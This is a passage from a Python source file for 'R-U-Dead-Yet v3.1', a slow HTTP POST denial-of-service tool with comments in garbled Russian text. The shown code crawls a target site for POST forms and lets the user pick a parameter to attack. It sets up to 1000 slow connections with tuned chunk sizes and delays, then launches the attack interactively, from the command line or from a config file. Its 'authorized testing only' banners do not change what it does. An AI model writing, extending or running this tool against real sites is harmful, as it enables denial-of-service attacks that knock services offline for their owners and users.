    """–ó–∞–≥—Ä—É–∂–∞–µ—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –∏–∑ —Ñ–∞–π–ª–∞"""
    config = ConfigParser()
    
    if not os.path.exists(config_file):
        logger.warning(f"Config file {config_file} not found, using defaults")
        return {}
    
    try:
        config.read(config_file)
        
        attack_config = {
            'url': config.get('parameters', 'URL', fallback=''),
            'num_connections': config.getint('parameters', 'number_of_connections', fallback=50),
            'attack_parameter': config.get('parameters', 'attack_parameter', fallback=''),
            'form_action': config.get('parameters', 'form_action', fallback=''),
            'chunk_min': config.getint('parameters', 'chunk_min', fallback=1),
            'chunk_max': config.getint('parameters', 'chunk_max', fallback=10),
            'delay_min': config.getfloat('parameters', 'delay_min', fallback=0.5),
            'delay_max': config.getfloat('parameters', 'delay_max', fallback=5.0),
            'content_length': config.getint('parameters', 'content_length', fallback=random.randint(5000000, 20000000))
        }
        
        return attack_config
        
    except Exception as e:
        logger.error(f"Error reading config: {e}")
        return {}

def interactive_mode():
    """–£–ª—É—á—à–µ–Ω–Ω—ã–π –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π —Ä–µ–∂–∏–º"""
    print("\n" + "="*70)
    print("üéØ R-U-Dead-Yet v3.1 - Enhanced Slow HTTP POST Test Tool")
    print("‚ö†Ô∏è  FOR AUTHORIZED SECURITY TESTING ONLY")
    print("="*70)
    
    # –í–≤–æ–¥ URL
    while True:
        url = input("\nEnter target URL (e.g., https://example.com): ").strip()
        if url:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            break
        print("URL is required!")
    
    # –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∞–π—Ç–∞
    print(f"\nüîç Scanning {url} for POST forms...")
    scanner = AdvancedTargetScanner(url)
    
    try:
        forms = scanner.scan_site(max_pages=15, max_depth=2)
        
        if not forms:
            print("‚ùå No POST forms found!")
            
            # –ü—Ä–µ–¥–ª–∞–≥–∞–µ–º —Ä—É—á–Ω–æ–π –≤–≤–æ–¥
            use_manual = input("\nWould you like to specify form manually? (y/n): ").lower()
            if use_manual == 'y':
                form_action = input("Enter form action URL: ").strip()
                if not form_action:
                    form_action = url
                    
                param_input = input("Enter POST parameter name: ").strip()
                if not param_input:
                    print("Parameter name required!")
                    return
                    
                forms = [{
                    'action': form_action,
                    'method': 'post',
                    'inputs': [param_input],
                    'source_url': url
                }]
            else:
                return
    except Exception as e:
        print(f"‚ùå Scan failed: {e}")
        return
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
    save_scan_results(forms)
    
    # –í—ã–±–æ—Ä —Ñ–æ—Ä–º—ã
    print(f"\n‚úÖ Found {len(forms)} POST forms:\n")
    for i, form in enumerate(forms, 1):
        print(f"{i}. {form['action']}")
        print(f"   Method: {form['method'].upper()}")
        print(f"   Parameters: {', '.join(form['inputs'][:5])}")
        if len(form['inputs']) > 5:
            print(f"   ... and {len(form['inputs']) - 5} more")
        if form.get('source_url'):
            print(f"   Source: {form['source_url']}")
        print()
    
    try:
        form_index = int(input(f"Select form (1-{len(forms)}): ")) - 1
        if form_index < 0 or form_index >= len(forms):
            form_index = 0
    except:
        form_index = 0
    
    selected_form = forms[form_index]
    
    # –í—ã–±–æ—Ä –ø–∞—Ä–∞–º–µ—Ç—Ä–∞
    if len(selected_form['inputs']) > 1:
        print(f"\nüìù Select parameter to attack:")
        for i, param in enumerate(selected_form['inputs'], 1):
            print(f"{i}. {param}")
        
        try:
            param_index = int(input(f"Select parameter (1-{len(selected_form['inputs'])}): ")) - 1
            if param_index < 0 or param_index >= len(selected_form['inputs']):
                param_index = 0
        except:
            param_index = 0
    else:
        param_index = 0
    
    selected_param = selected_form['inputs'][param_index]
    
    # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∞—Ç–∞–∫–∏
    print("\n‚öôÔ∏è  Attack Configuration:")
    
    try:
        num_conn = input(f"Number of connections (1-1000, default 100): ").strip()
        num_conn = int(num_conn) if num_conn else 100
        num_conn = max(1, min(num_conn, 1000))
    except:
        num_conn = 100
    
    try:
        chunk_min = input(f"Minimum chunk size (1-100, default 1): ").strip()
        chunk_min = int(chunk_min) if chunk_min else 1
        chunk_min = max(1, min(chunk_min, 100))
    except:
        chunk_min = 1
    
    try:
        chunk_max = input(f"Maximum chunk size (1-100, default 10): ").strip()
        chunk_max = int(chunk_max) if chunk_max else 10
        chunk_max = max(chunk_min, min(chunk_max, 100))
    except:
        chunk_max = 10
    
    try:
        delay_min = input(f"Minimum delay (0.1-10, default 0.5): ").strip()
        delay_min = float(delay_min) if delay_min else 0.5
        delay_min = max(0.1, min(delay_min, 10))
    except:
        delay_min = 0.5
    
    try:
        delay_max = input(f"Maximum delay (0.1-30, default 5.0): ").strip()
        delay_max = float(delay_max) if delay_max else 5.0
        delay_max = max(delay_min, min(delay_max, 30))
    except:
        delay_max = 5.0
    
    # –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ
    print(f"\nüìã Attack configuration:")
    print(f"   Target URL: {selected_form['action']}")
    print(f"   Parameter: {selected_param}")
    print(f"   Connections: {num_conn}")
    print(f"   Chunk size: {chunk_min}-{chunk_max} bytes")
    print(f"   Delay: {delay_min}-{delay_max} seconds")
    print(f"\n‚ö†Ô∏è  WARNING: This will send {num_conn} slow POST requests!")
    print(f"   Estimated traffic: ~{num_conn * 5000000 / 1024 / 1024:.1f} MB")
    
    confirm = input("\nType 'CONFIRM' to start attack: ")
    if confirm != 'CONFIRM':
        print("Attack cancelled.")
        return
    
    # –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏
    manager = IntelligentConnectionManager()
    attack_config = {
        'chunk_min': chunk_min,
        'chunk_max': chunk_max,
        'delay_min': delay_min,
        'delay_max': delay_max
    }
    
    try:
        print("\n" + "="*70)
        manager.start_attack(
            url,
            selected_form['action'],
            selected_param,
            num_conn,
            attack_config
        )
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
    except Exception as e:
        print(f"\n‚ùå Error: {e}")

def main():
    """–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è"""
    parser = argparse.ArgumentParser(
        description='R-U-Dead-Yet v3.1 - Enhanced Slow HTTP POST Test Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s --url https://example.com --param login --connections 100
  %(prog)s --config myconfig.conf
  %(prog)s --scan-only https://example.com
        '''
    )
    
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-c', '--config', help='Configuration file', default='rudeadyet.conf')
    parser.add_argument('-p', '--param', help='POST parameter name')
    parser.add_argument('-a', '--action', help='Form action URL (if different from target)')
    parser.add_argument('-n', '--connections', type=int, default=100, help='Number of connections (1-1000)')
    parser.add_argument('-s', '--scan-only', action='store_true', help='Scan only, don\'t attack')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output scan results to file')
    parser.add_argument('--chunk-min', type=int, default=1, help='Minimum chunk size')
    parser.add_argument('--chunk-max', type=int, default=10, help='Maximum chunk size')
    parser.add_argument('--delay-min', type=float, default=0.5, help='Minimum delay between chunks')
    parser.add_argument('--delay-max', type=float, default=5.0, help='Maximum delay between chunks')
    
    args = parser.parse_args()
    
    # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ verbose
    if args.verbose:
        logger.setLevel(logging.DEBUG)
        logger.debug("Verbose mode enabled")
    
    # –ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ
    if not args.scan_only:
        print("\n" + "="*70)
        print("‚ö†Ô∏è  WARNING: This tool is for AUTHORIZED SECURITY TESTING only!")
        print("   Using it against systems without permission is ILLEGAL.")
        print("   You are solely responsible for your actions.")
        print("="*70 + "\n")
    
    if args.scan_only and args.url:
        # –†–µ–∂–∏–º —Ç–æ–ª—å–∫–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
        print(f"Scanning {args.url}...")
        scanner = AdvancedTargetScanner(args.url)
        forms = scanner.scan_site()
        
        if forms:
            print(f"\nFound {len(forms)} POST forms:")
            for form in forms:
                print(f"\n  Action: {form['action']}")
                print(f"  Method: {form['method']}")
                print(f"  Parameters: {', '.join(form['inputs'])}")
            
            if args.output:
                save_scan_results(forms, args.output)
        else:
            print("No POST forms found.")
        
        return
    
    if args.url:
        # –ö–æ–º–∞–Ω–¥–Ω–∞—è —Å—Ç—Ä–æ–∫–∞ —Ä–µ–∂–∏–º
        if not args.param:
            print("Error: POST parameter required with --url")
            print("Use --scan-only to scan for parameters")
            return
        
        form_action = args.action or args.url
        
        print(f"\nüìã Attack configuration:")
        print(f"   Target: {args.url}")
        print(f"   Form action: {form_action}")
        print(f"   Parameter: {args.param}")
        print(f"   Connections: {args.connections}")
        print(f"   Chunk size: {args.chunk_min}-{args.chunk_max} bytes")
        print(f"   Delay: {args.delay_min}-{args.delay_max} seconds")
        
        if not args.verbose:
            confirm = input("\nType 'YES' to confirm: ")
            if confirm != 'YES':
                print("Attack cancelled.")
                return
        
        manager = IntelligentConnectionManager()
        attack_config = {
            'chunk_min': args.chunk_min,
            'chunk_max': args.chunk_max,
            'delay_min': args.delay_min,
            'delay_max': args.delay_max
        }
        
        try:
            manager.start_attack(
                args.url,
                form_action,
                args.param,
                args.connections,
                attack_config
            )
        except KeyboardInterrupt:
            print("\nAttack stopped.")
            
    elif os.path.exists(args.config):
        # –†–µ–∂–∏–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞
        config = load_config(args.config)
        if config.get('url') and config.get('attack_parameter'):
            print(f"Config loaded:")
            print(f"  URL: {config['url']}")
            print(f"  Parameter: {config['attack_parameter']}")
            print(f"  Connections: {config['num_connections']}")
            
            confirm = input("\nType 'YES' to start: ")
            if confirm != 'YES':
                print("Attack cancelled.")
                return
            
            manager = IntelligentConnectionManager()
            manager.start_attack(
                config['url'],
                config.get('form_action', config['url']),
                config['attack_parameter'],
                config['num_connections'],
                config
            )
        else:
            print("Invalid config file. Missing required parameters.")
    else:
        # –ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π —Ä–µ–∂–∏–º
        interactive_mode()

if __name__ == '__main__':
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–µ—Ä—Å–∏–∏ Python
    if sys.version_info < (3, 6):
        print("‚ùå Error: Python 3.6 or higher required")
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nüëã Exiting...")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
